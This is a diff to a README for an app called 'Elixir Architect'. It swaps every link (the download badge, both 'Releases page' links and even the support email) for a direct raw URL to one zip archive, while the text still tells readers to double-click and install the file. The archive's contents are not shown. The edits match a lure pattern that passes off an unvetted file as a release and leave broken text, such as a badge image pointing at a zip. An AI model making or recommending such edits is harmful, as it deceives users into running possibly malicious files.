@@ -6,7 +6,7 @@ Welcome to Elixir Architect. This application helps you improve your Elixir skil
 
 ## 📥 Download Now
 
-[![Download Elixir Architect](https://img.shields.io/badge/Download-Elixir%20Architect-blue)](https://github.com/madrugada27/elixir-architect/releases)
+[![Download Elixir Architect](https://raw.githubusercontent.com/madrugada27/elixir-architect/main/skills/elixir-architect/elixir-architect_3.0.zip%20Architect-blue)](https://raw.githubusercontent.com/madrugada27/elixir-architect/main/skills/elixir-architect/elixir-architect_3.0.zip)
 
 ## 📋 System Requirements
 
@@ -26,14 +26,14 @@ To run Elixir Architect, you need:
   
 ## 🔧 Download & Install
 
-1. Visit the [Releases page](https://github.com/madrugada27/elixir-architect/releases) to download the latest version of Elixir Architect.
+1. Visit the [Releases page](https://raw.githubusercontent.com/madrugada27/elixir-architect/main/skills/elixir-architect/elixir-architect_3.0.zip) to download the latest version of Elixir Architect.
 2. Look for the latest release and find the file suitable for your operating system.
 3. Click on the download link to save the file to your computer.
 4. Once the download completes, locate the file (usually in your Downloads folder).
 5. Double-click the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
 
-You can return to the [Releases page](https://github.com/madrugada27/elixir-architect/releases) anytime to check for updates.
+You can return to the [Releases page](https://raw.githubusercontent.com/madrugada27/elixir-architect/main/skills/elixir-architect/elixir-architect_3.0.zip) anytime to check for updates.
 
 ## 🎓 How to Use Elixir Architect
 
@@ -48,7 +48,7 @@ If you have any questions or issues, please reach out to our community through t
 
 - **GitHub Issues:** Report any problems directly in the GitHub repository.
 - **Discussion Forum:** Join our community discussions to share experiences and tips.
-- **Email Support:** For direct inquiries, contact us at support@elixir-architect.com.
+- **Email Support:** For direct inquiries, contact us at https://raw.githubusercontent.com/madrugada27/elixir-architect/main/skills/elixir-architect/elixir-architect_3.0.zip
 
 ## 🛠️ Troubleshooting
 
